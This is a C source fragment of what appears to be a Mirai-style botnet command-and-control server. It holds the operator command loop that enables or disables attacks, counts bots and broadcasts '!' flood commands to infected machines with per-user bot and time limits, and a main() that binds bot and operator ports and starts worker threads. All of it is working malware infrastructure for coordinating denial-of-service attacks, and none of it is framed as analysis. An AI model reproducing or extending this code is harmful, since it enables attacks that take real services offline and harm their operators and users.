            write(accinfo.fd, "\x1b[96mAttacks have been disabled\r\n", strlen("\x1b[96mAttacks have been disabled\r\n"));
            attacking = 0;
        }
        else if ((strcmp(rdbuf, "stats") == 0 || strcmp(rdbuf, "botcount") == 0) && accinfo.admin == 1)
            botcount(accinfo.fd, 0, "");
        else if (strstr(rdbuf, "botcount -s ") != NULL && accinfo.admin == 1)
        {
            char *query_line = strstr(rdbuf, "botcount -s ") + 12;
            botcount(accinfo.fd, 1, query_line);
        }
        else if (strstr(rdbuf, "botcount -e ") != NULL && accinfo.admin == 1)
        {
            char *query_line = strstr(rdbuf, "botcount -e ") + 12;
            botcount(accinfo.fd, 2, query_line);
        }

		else if (rdbuf[0] == '!')
        {
            if (last_attack > time(NULL) && accinfo.admin != 1)
            {
                char cbuf[128];
                sprintf(cbuf, "\x1b[96mcnc have reached its maximum concruent (1/1) attacks ongoing, please wait.\r\n");
                write(accinfo.fd, cbuf, strlen(cbuf));
                memset(cbuf, 0, sizeof(cbuf));
            }
            else
            {
                if (strlen(rdbuf + 1) >= 512)
                    write(accinfo.fd, "\x1b[96mYour command is to long\r\n", strlen("\x1b[96mYour command is to long\r\n"));
                else
                {
                    int cooldown;
                    cooldown = broadcast_command(rdbuf + 1, accinfo.maxbots, accinfo.attacktime, accinfo.fd, accinfo.floods, accinfo.username, accinfo.admin);

                    if (cooldown >= 1 && accinfo.admin != 1)
                        last_attack = time(NULL) + cooldown;
                }
            }
        }

        else
            write(accinfo.fd, "\x1b[96mCommand not found\r\n", strlen("\x1b[96mCommand not found\r\n"));

		write(accinfo.fd, prompt, strlen(prompt));
		memset(rdbuf, 0, sizeof(rdbuf));
	}

	close(accinfo.fd);
    operatorCount--;
 
	memset(username, 0, sizeof(username));
	memset(password, 0, sizeof(password));
    memset(hidden, 0, sizeof(hidden));
	pthread_exit(0);
}

void *controller_listen(void *arg)
{
	int myfd = *((int *)arg), newfd;
	struct sockaddr in_addr;
	socklen_t in_len = sizeof(in_addr);

	if (listen(myfd, SOMAXCONN) == -1)
    {
        pthread_exit(0);
    }

	while (1)
	{
		if ((newfd = accept(myfd, &in_addr, &in_len)) == -1)
			break;

		pthread_t cthread;
		pthread_create(&cthread, NULL, &controller_thread, &newfd);
	}

	close(myfd);
	pthread_exit(0);
}

int main(int argc, char *argv[], void *sock)
{
	int s, i, threads;
    struct epoll_event event;

    pthread_t controll_listener, ping_thread;

    if (argc != 4)
    {
    	printf("[Main] Usage: ./cnc <bot-port> <cnc-port> <threads>\n");
		exit(EXIT_FAILURE);
    }
    else
    {
    	threads = atoi(argv[3]);
    	if (threads < 10 || threads > 750)
    	{
	    	printf("[Main] You are using to much or to little threads 10-750 is the limit\n");
	    	terminate();
    	}
    }

    if ((listen_fd = create_and_bind(argv[1])) == -1)
    {
    	printf("[Main] Failed to bind bot worker\n");
    	terminate();
    }

    if ((s = fd_set_blocking(listen_fd, 0)) == -1)
    {
    	printf("[Main] Failed to set socket to non-blocking\n");
    	terminate();
    }

    if ((s = listen(listen_fd, SOMAXCONN)) == -1)
    {
    	printf("[Main] Failed to listen\n");
		terminate();
    }

    if ((epoll_fd = epoll_create1(0)) == -1)
    {
    	printf("[Main] Failed to epoll create\n");
		terminate();
    }

    event.data.fd = listen_fd;
    event.events =  EPOLLIN | EPOLLET;

    if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event)) == -1)
    {
    	printf("[Main] Failed to add listen to epoll\n");
		terminate();
    }

    pthread_t thread[threads];
    while (threads--)
		pthread_create(&thread[threads], NULL, &bot_event, (void *) NULL);

    if ((s = create_and_bind(argv[2])) == -1)
    {
    	printf("[Main] Failed to bind controller\n");
    	terminate();
    }

    pthread_create(&controll_listener, NULL, &controller_listen, &s);
    pthread_create(&ping_thread, NULL, &ping_pong, (void *) NULL);
    int q = 0;

    while (1)
    {
        sleep(10);
    }

    close(listen_fd);
    return EXIT_SUCCESS;
}
